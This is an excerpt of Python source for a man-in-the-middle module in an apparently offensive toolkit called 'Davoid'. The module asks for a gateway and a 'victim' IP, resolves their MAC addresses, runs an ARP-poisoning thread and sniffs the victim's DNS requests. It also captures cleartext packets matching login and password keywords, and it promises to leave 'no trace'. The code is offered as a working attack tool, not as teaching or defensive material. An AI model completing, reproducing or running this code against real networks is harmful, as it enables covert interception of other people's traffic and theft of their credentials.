...
class MITMEngine:
    ...
    def toggle_ip_forwarding(self, enable=True):
        ...
        try:
            ...
            console.print(
                f"[bold red][!] Could not toggle IP forwarding (Requires sudo):[/bold red] {e}")
    ...
    def restore_network(self):
        ...
        try:
            ...
            console.print(
                "[bold green][+] Network successfully restored. No trace left.[/bold green]")
        except Exception:
            pass
    ...
    def process_packet(self, packet):
        ...
        if (packet[scapy.IP].src != self.target_ip
                and packet[scapy.IP].dst != self.target_ip):
            return
        ...
        if packet.haslayer(scapy.DNSQR):
            ...
            console.print(
                f"[cyan][DNS][/cyan] Victim requested: [white]{query}[/white]")
            db.log("MITM-DNS", self.target_ip,
                   f"Requested domain: {query}", "INFO")
        ...
        if packet.haslayer(scapy.Raw):
            try:
                ...
                if any(keyword in payload
                       for keyword in ["POST ", "USER ", "PASS ", "login", "password"]):
                    console.print(
                    ...
                    db.log("MITM-Payload", self.target_ip,
                           f"Captured Traffic:\n{payload}", "HIGH")
            except Exception:
                pass
    ...
    def run(self):
        ...
        # hasattr guard makes this safe on Windows where os.getuid doesn't exist
        is_root = False
        ...
        if not is_root:
            console.print(
                "[bold red][!] MITM attacks require raw socket access. "
                "Please restart Davoid with 'sudo'.[/bold red]")
        ...
        self.gateway_ip = questionary.text(
            "Gateway/Router IP:", default=default_gw, style=Q_STYLE).ask()
        if not self.gateway_ip:
            return

        self.target_ip = questionary.text(
            "Victim IP Address:", style=Q_STYLE).ask()
        if not self.target_ip:
            return

        with console.status(
                "[bold cyan]Resolving MAC addresses...", spinner="bouncingBar"):
            self.target_mac  = self.get_mac(self.target_ip)
            self.gateway_mac = self.get_mac(self.gateway_ip)

        if not self.target_mac:
            console.print(
                f"[bold red][!] Could not find MAC address for Victim "
                f"({self.target_ip}). Are they online?[/bold red]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.gateway_mac:
            console.print(
                f"[bold red][!] Could not find MAC address for Gateway "
                f"({self.gateway_ip}).[/bold red]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return
        ...
        poison_thread = threading.Thread(
            target=self.poison_loop, daemon=True)
        poison_thread.start()

        console.print(
            "[bold green][*] ARP Poisoning active. "
            "Victim traffic is now flowing through Davoid.[/bold green]")
        console.print(
            "[dim]Note: Modern HTTPS traffic will be encrypted. "
            "You will only see DNS requests and cleartext payloads.[/dim]")
        console.print(
            "[bold yellow][!] Sniffing packets... "
            "(Press Ctrl+C to stop and heal network)[/bold yellow]\n")
